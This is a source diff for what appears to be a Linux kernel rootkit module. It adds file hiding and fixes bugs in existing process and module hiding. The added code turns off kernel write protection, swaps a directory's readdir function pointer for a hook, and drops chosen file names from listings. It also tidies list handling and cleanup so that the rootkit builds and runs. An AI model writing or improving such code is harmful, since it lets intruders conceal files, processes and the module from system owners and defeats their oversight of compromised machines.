@@ -7,6 +7,7 @@
 #include <linux/cred.h>
 #include <linux/init.h>
 #include <linux/list.h>
+#include <linux/mutex.h>
 
 #define CONTROL_DIR "harmless_file"
 #define HIDE_MODULE_FILE "hide_module"
@@ -53,22 +54,26 @@ static struct file_operations *procfs_fops=NULL;
 static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);
 
 static filldir_t kernel_filldir=NULL;
+static filldir_t file_kernel_filldir=NULL;
 
 static char internal_buffer[INTERNAL_BUFFER_LEN];
 static char mydir[INTERNAL_BUFFER_LEN], myfile[INTERNAL_BUFFER_LEN];
 
 static char param[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
+static char filename[INTERNAL_BUFFER_LEN];
 
 static struct list_head *module_prev=NULL, *module_kobj_prev ;
 static struct kobject* module_kobj_parent=NULL;
 
+DEFINE_MUTEX(filldir_mutex);
+static struct list_head *banned_files;
 
 LIST_HEAD(hidden_pid_list);
 LIST_HEAD(hooked_dir_list);
 
 static char* strdup(const char* str){
 	char * tmp;
-	tmp = kmalloc(count+1, GFP_KERNEL);
+	tmp = kmalloc(strlen(str)+1, GFP_KERNEL);
 	strcpy(tmp, str);
 	return tmp;
 }
@@ -83,7 +88,7 @@ static inline void enable_wp(void){
 }
 
 
-static  struct file_entry* create_file_entry(char *name,struct list_head* head){
+static  struct file_entry* create_file_entry(const char *name,struct list_head* head){
 
 	struct file_entry* tmp=NULL;
 
@@ -124,57 +129,20 @@ static struct file_entry*  find_file_entry(const char *name, struct list_head* h
 
 }
 
-static  struct hooked_dir* create_hooked_dir_entry(char *name,struct list_head* head){
 
-	struct hooked_dir* tmp=NULL;
-	struct file* fp;
 
-	fp = filp_open(name, O_RDONLY, 0);
 
-	if(fp == NULL){
-		printk(KERN_IFNO"%s: failed opening file", MODULE_NAME);
-		return NULL;
-	}
-
-	tmp->fops = fp -> f_op;
-	tmp->readdir = tmp->fops->readdir;
-
-	disable_wp();
-	tmp->fops->readdir = file_hider;
-	enable_wp();	
-
-	filp_close(fp);
-
-	tmp = kmalloc(sizeof(struct hooked_dir), GFP_KERNEL);	
-
-	if(tmp == NULL){
-		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
-		return NULL;
-	}
-
-	tmp->name = strdup(name);
-
-	if( tmp->name == NULL){
-		kfree(tmp);
-		printk (KERN_INFO"%s: out of memory", MODULE_NAME);
-		return NULL;
-	}
-
-	INIT_LIST_HEAD(&tmp->hidden_files_list);
-	list_add( &tmp->list, head);
-
-	return tmp;
-}
 
 static void delete_hooked_dir_entry(struct hooked_dir* entry){
-	list_del(&entry->list);
 	struct list_head* tmp;
 	struct file_entry* f_entry;
 	
+	list_del(&entry->list);
+
 	while(!list_empty(&entry->hidden_files_list)){
 		tmp = entry->hidden_files_list.prev;		
 		f_entry = list_entry(tmp , struct file_entry, list);
-		delete_file_entry(tmp);
+		delete_file_entry(f_entry);
 	}	
 		
 	disable_wp();
@@ -199,7 +167,100 @@ static struct hooked_dir* find_hooked_dir_entry(const char*name, struct list_hea
 
 }
 
+static void clear_hooked_dirs(void){
+	struct hooked_dir* dir_entry;
+	struct list_head* tmp;
+	while(!list_empty(&hooked_dir_list)){
+		tmp = hooked_dir_list.prev;		
+		dir_entry = list_entry(tmp , struct hooked_dir, list);
+		delete_hooked_dir_entry(dir_entry);
+	}	
 
+}
+
+static int file_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
+	
+	if(find_file_entry(name, banned_files) !=NULL){
+		return 0;
+	}
+
+	return kernel_filldir(buf,name,namelen,offset,ino, d_type);
+}
+
+static int file_hider(struct file* fp, void* d, filldir_t filldir){
+
+	struct hooked_dir* hd;
+	char *magic;
+	int ret;
+
+	magic = dentry_path(fp->f_dentry,filename,INTERNAL_BUFFER_LEN);
+
+	if(IS_ERR(magic)){
+		printk(KERN_INFO"%s error retrieving dir name inc mess", MODULE_NAME);
+		return -1;
+	}
+
+
+	hd = find_hooked_dir_entry(filename, &hooked_dir_list);
+	
+	if(hd == NULL){
+		printk(KERN_INFO"%s something is badly broken", MODULE_NAME);
+		return hd->readdir(fp, d, file_kernel_filldir);
+	}
+
+	mutex_lock(&filldir_mutex);	
+	file_kernel_filldir = filldir;
+	banned_files = &hd -> hidden_files_list;
+	ret =  hd->readdir(fp, d, file_filldir_hider);
+	mutex_unlock(&filldir_mutex);
+
+	return ret;
+}
+
+static  struct hooked_dir* create_hooked_dir_entry(const char *name,struct list_head* head){
+
+	struct hooked_dir* tmp=NULL;
+	struct file* fp;
+
+	tmp = kmalloc(sizeof(struct hooked_dir), GFP_KERNEL);	
+
+	if(tmp == NULL){
+		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
+		return NULL;
+	}
+
+	tmp->name = strdup(name);
+
+	if( tmp->name == NULL){
+		kfree(tmp);
+		printk (KERN_INFO"%s: out of memory", MODULE_NAME);
+		return NULL;
+	}
+
+	fp = filp_open(name, O_RDONLY, 0);
+
+	if(fp == NULL){
+		printk(KERN_INFO"%s: failed opening file", MODULE_NAME);
+		kfree(tmp->name);
+		kfree(tmp);
+		return NULL;
+	}
+
+	tmp->fops = (struct  file_operations*)fp -> f_op;
+	tmp->readdir = tmp->fops->readdir;
+
+	disable_wp();
+	tmp->fops->readdir = file_hider;
+	enable_wp();	
+
+	filp_close(fp,NULL);
+
+
+	INIT_LIST_HEAD(&tmp->hidden_files_list);
+	list_add( &tmp->list, head);
+
+	return tmp;
+}
 
 static int proc_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
 	
@@ -241,21 +302,21 @@ static int hide_file_read(char *buffer, char **buffer_location, off_t off, int c
 }
 
 static void hide_file(const char*dir, const char *name){
-	hooked_dir* hd=NULL;
-	file_entry* fe;
-	hd = find_hooked_dir_entry(dir,hooked_dir_list);
+	struct hooked_dir* hd=NULL;
+	struct file_entry* fe;
+	hd = find_hooked_dir_entry(dir,&hooked_dir_list);
 
 	if(hd == NULL){
-		hd = create_hooked_dir_entry(name,hooked_dir_list);
+		hd = create_hooked_dir_entry(name,&hooked_dir_list);
 		if ( hd == NULL){
 			return;
 		}
 	}
-	fe = find_file_entry(name, hd->hidden_files_list);
+	fe = find_file_entry(name, &hd->hidden_files_list);
 
 	if(fe == NULL){
-		fe = create_file_entry(name, hd->hidden_files_list);
-		if(fe == NULL && list_empty(hd->hidden_files_list)){
+		fe = create_file_entry(name, &hd->hidden_files_list);
+		if(fe == NULL && list_empty(&hd->hidden_files_list)){
 			delete_hooked_dir_entry(hd);
 		}
 	}
@@ -264,20 +325,20 @@ static void hide_file(const char*dir, const char *name){
 
 static void show_file(const char* dir, const char *name){
 
-	hooked_dir* hd=NULL;
-	file_entry* fe;
-	hd = find_hooked_dir_entry(dir,hooked_dir_list);
+	struct hooked_dir* hd=NULL;
+	struct file_entry* fe;
+	hd = find_hooked_dir_entry(dir,&hooked_dir_list);
 
 	if(hd == NULL){
 			return;
 	}
 
-	fe = find_file_entry(name, hd->hidden_files_list);
+	fe = find_file_entry(name, &hd->hidden_files_list);
 
 	if(fe != NULL){
-		delete_file_entry(name);
+		delete_file_entry(fe);
 
-		if(list_empty(hd->hidden_files_list)){
+		if(list_empty(&hd->hidden_files_list)){
 			delete_hooked_dir_entry(hd);
 		}
 
@@ -298,9 +359,16 @@ static int get_filendir(char *str, char* dirname, char *filename){
 	return sscanf(str,"%s %s", dirname, filename) == 2 ; 
 }
 
+
+static int get_command(const char* input,char* cpybuf, char* cmd1, char* cmd2, unsigned long len){
+
+	strncpy(cpybuf, input, min((len+1),(unsigned long) INTERNAL_BUFFER_LEN));
+	cpybuf[min(len,(unsigned long ) INTERNAL_BUFFER_LEN)]=0;
+	return sscanf(cpybuf, "%s %s", command, param) == 2;
+}
+
+
 static int hide_file_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
-	struct file_entry *fe;
-	struct hooked_dir *hd;	
 
 	if(!get_command(buf,internal_buffer, command,param,count)){
 		return count;
@@ -322,20 +390,11 @@ static int hide_file_write(struct file* file, const char __user * buf, unsigned 
 
 }
 
-static int get_command(const char* input,char* cpybuf, char* cmd1, char* cmd2, unsigned long len){
-
-
-	strncpy(cpybuf, input, min((len+1),(unsigned long) INTERNAL_BUFFER_LEN));
-	cpybuf[min(len,(unsigned long ) INTERNAL_BUFFER_LEN)]=0;
-	return sscanf(cpybuf, "%s %s", command, param) == 2;
-}
-
-
 static int pid_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
 
 	struct file_entry* tmp=NULL;
 
-	if(!get_command(buf,internat_buffer, command,param,count)){
+	if(!get_command(buf,internal_buffer, command,param,count)){
 		return count;
 	}
 	
@@ -528,6 +587,7 @@ static int __init m_init(void){
 }
 
 static void __exit m_exit(void){
+	clear_hooked_dirs();
 	proc_cleanup();
 	control_cleanup();
 	return;
